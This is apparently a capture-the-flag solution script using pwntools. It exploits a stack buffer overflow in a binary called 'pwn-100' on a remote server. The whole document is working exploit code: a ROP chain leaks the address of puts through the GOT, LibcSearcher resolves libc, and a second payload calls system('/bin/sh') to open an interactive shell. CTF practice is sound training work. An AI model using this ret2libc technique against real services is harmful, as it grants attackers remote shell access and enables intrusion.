from pwn import *
from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./pwn-100"
# libc_binary = "./"

# p = process(argv=[binary])
p = remote("220.249.52.133", 59602)

elf = ELF(binary)
# libc = ELF(libc_binary)

pop_rdi = 0x400763
puts_plt = elf.sym["puts"]
puts_got = elf.got["puts"]
main_addr = 0x4006b8

context.arch = "amd64"
payload = flat([
    "a"*(0x40+8),pop_rdi,puts_got,puts_plt,main_addr
]).ljust(200,"p")
# gdb.attach(p)
p.send(payload)
p.recvuntil("bye~" + "\n")
call_back = u64(p.recv(6).ljust(8,"\x00"))
p.recv()
log.success("puts address: " + hex(call_back))

libc = LibcSearcher("puts",call_back)
libc_base = call_back - libc.dump("puts")
log.success("libc_base address: " + hex(libc_base))
system_addr = libc_base + libc.dump("system")
sh_addr = libc_base + libc.dump("str_bin_sh")

payload = flat([
    "a"*(0x48),pop_rdi,sh_addr,system_addr
]).ljust(200,"t")

p.send(payload)

p.interactive()
